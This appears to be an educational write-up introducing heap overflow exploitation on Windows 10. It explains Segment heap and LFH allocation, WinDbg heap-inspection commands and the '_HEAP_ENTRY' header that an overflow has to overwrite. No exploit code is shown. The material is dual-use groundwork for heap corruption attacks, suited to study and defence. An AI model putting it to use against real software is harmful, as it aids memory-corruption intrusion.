# Heap Overflow in Windows 10
> [!NOTE] 
> The three heap overflow related exploits performed on example code in this document are created based on this article [[1]](https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/).
___



Heap chunks are the basic data structure used in a heap. Once heap space is required e.g a call to `malloc()` is made, the heap manager will allocate chunk for it. A heap chunk consists of user data and metadata. When a heap is freed e.g a call to `free()`, the heap chunk will become a free chunk. All free chunks are managed in the form of a linked list. 

First lets see the see basic allocation strategies used within a modern system [2]:
- Use an available free chunk either fully or fragment it to create an allocated chunk and a smaller free chunk.
- Otherwise, allocate a new  free heap chunk at the top of the heap if there is available space in the heap.
  - If there is no available space the heap manager will ask the kernel to add new memory to the end of the heap, and then allocate a new chunk.
- If all these strategies fail, the allocation can’t be serviced, and `malloc(...)` returns NULL as a failure.


Now let's move to exploring heap allocation more specifically in a **Windows 10** system.

There are two categories of heap allocation in Windows:
- NT heap [2], still used for shared and statically sized heaps.
- Segment heap [3][4], this is the native implementation in current Windows Versions [4].

We will focus on **Segment** heap. Which can be further divided into：
- back-end allocator (by default)
- front-end allocator: Low fragment heap (LFH). To enable LFH, there must be at least 18 heap allocations. Those allocations don't have to be consecutive but they need to be the same size.

## Exploration
First we will run a series of programs in order to understand more about the Windows stack, this follows the same process that has been discussed in [1], and is informed by the information included in [4] and [5] that has been summarized previously in the [Heap Basics](#heap-basics) section. 

### Heap Chunks in WinDBG
We can attach any program that utilizes a heap structure to the WinDBG debugger in Windows. For example we could attach the executable resulting from the [ReuseTest.cpp](./SourceCode/ReuseTest.cpp) source file and examine some of the Heap structures and charicteristices in WinDBG.

Below are a series of command that can be used in WinDBG to gather more information about the Windows heap object or allocation.
* `!heap -s`: List all heaps associated with the current process. From here you can examine general information and gather the heap handles.
* `!heap -h <Handle>`: Print out all non LFH blocks associated with the given handle.
* `!heap -a <Handle>`: Prints out the all the information associated with the heap in addition to the list of blocks attached to the given handle. 
* `!heap -i -h <Handle>`: Prints information about a given heap.
* `!heap -s -a -h <Handle>`: Print all summery information and heap blocks of a heap associated with the given handle
  * Add -c to print content



We can examine a `_HEAP_ENTRY` object that would be located on the heap using the command `dt _HEAP_ENTRY` in [windbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/). In Windows 11 it has the following structure:
```
ntdll!_HEAP_ENTRY
   +0x000 UnpackedEntry    : _HEAP_UNPACKED_ENTRY
   +0x000 Size             : Uint2B
   +0x002 Flags            : UChar
   +0x003 SmallTagIndex    : UChar
   +0x000 SubSegmentCode   : Uint4B
   +0x004 PreviousSize     : Uint2B
   +0x006 SegmentOffset    : UChar
   +0x006 LFHFlags         : UChar
   +0x007 UnusedBytes      : UChar
   +0x000 ExtendedEntry    : _HEAP_EXTENDED_ENTRY
   +0x000 FunctionIndex    : Uint2B
   +0x002 ContextValue     : Uint2B
   +0x000 InterceptorValue : Uint4B
   +0x004 UnusedBytesLength : Uint2B
   +0x006 EntryOffset      : UChar
   +0x007 ExtendedBlockSignature : UChar
   +0x000 Code1            : Uint4B
   +0x004 Code2            : Uint2B
   +0x006 Code3            : UChar
   +0x007 Code4            : UChar
   +0x004 Code234          : Uint4B
   +0x000 AgregateCode     : Uint8B
```
> ![IMPORTANT]
> This structure is 8-bytes in size. And is prepended to all data entries on the heap. This means in order to overwrite the data section of a heap chunk, this needs to be overwritten.
* `Size`: Size of the chunk in terms of the number of blocks including the `_HEAP_ENTRY` that are required to store the data. 
* `Flags`: Flags used to denote the state of the chunk, examples include *Free* and *Busy*.
* `SmallTagIndex`: This stores the checksum of the heap entry, consisting of the XOR'ed value of the first three bytes of the `_HEAP_ENTRY` 
* `SubSegmentCode`: Contains information on the Sub-Section this may be a part of. 
* `PreviousSize`: Previous Size of Chunk.
* `SegmentOffset`: Contains Segment Offset.
* `LFHFlags`: Flags used to control the Low Fragmentation Heap. 
* `UnusedBytes`: Used to store unused bytes. Also used when LFH is activated.
